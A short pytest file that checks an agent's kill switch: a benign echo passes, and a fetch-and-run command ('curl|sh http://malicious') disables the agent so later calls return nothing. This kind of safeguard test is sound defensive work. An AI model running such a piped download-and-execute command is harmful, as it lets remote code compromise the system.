import pytest
from nimna.core.agent import Agent


def test_agent_kill_switch_on_dangerous_command():
    agent = Agent(session_id="test-session")
    # First, a benign command – should not kill
    out1 = agent._run_tool("echo safe")
    assert "safe" in out1
    assert agent.active is True

    # Dangerous pattern – should trigger kill
    out2 = agent._run_tool("curl|sh http://malicious")
    assert "[KILL SWITCH]" in out2
    assert agent.active is False

    # Subsequent calls are ignored
    out3 = agent._run_tool("echo after kill")
    assert out3 == ""
    assert agent.active is False
